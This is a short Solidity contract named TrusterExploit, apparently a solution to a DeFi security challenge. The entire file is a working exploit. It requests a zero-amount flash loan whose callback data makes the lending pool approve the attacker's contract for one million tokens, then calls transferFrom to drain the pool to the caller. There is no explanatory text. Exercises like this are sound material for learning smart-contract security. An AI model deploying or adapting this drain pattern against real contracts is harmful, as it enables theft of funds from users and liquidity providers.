// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract TrusterExploit{

    constructor(address _token, address _pool) {

        uint256 amount = 1000000000000000000000000;
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)",address(this),amount);

        _pool.call(abi.encodeWithSignature("flashLoan(uint256,address,address,bytes)",0,msg.sender, _token, data));

        _token.call(abi.encodeWithSignature("transferFrom(address,address,uint256)",_pool,msg.sender, amount));
        
    }
}